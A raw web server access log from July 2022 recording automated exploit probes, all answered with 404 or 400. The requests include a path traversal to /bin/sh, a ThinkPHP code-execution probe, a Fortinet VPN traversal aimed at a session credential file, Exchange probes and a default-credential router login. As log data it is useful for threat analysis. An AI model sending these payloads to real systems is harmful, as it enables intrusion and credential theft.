5.188.210.227 - - [19/Jul/2022:14:34:19 +0900] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 4582 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
185.7.214.104 - - [19/Jul/2022:18:41:04 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
192.241.213.19 - - [19/Jul/2022:23:24:59 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.104 - - [20/Jul/2022:03:17:29 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
216.131.114.133 - - [20/Jul/2022:09:15:49 +0900] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 12967 "-" "Python-urllib/3.10"
192.241.220.237 - - [20/Jul/2022:11:11:07 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
185.147.213.194 - - [20/Jul/2022:12:05:22 +0900] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 12967 "-" "Python-urllib/3.10"
185.7.214.104 - - [20/Jul/2022:12:15:42 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
59.96.243.248 - - [20/Jul/2022:16:56:19 +0900] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 12967 "-" "-"
185.7.214.104 - - [20/Jul/2022:18:02:54 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
192.241.221.222 - - [20/Jul/2022:23:32:12 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
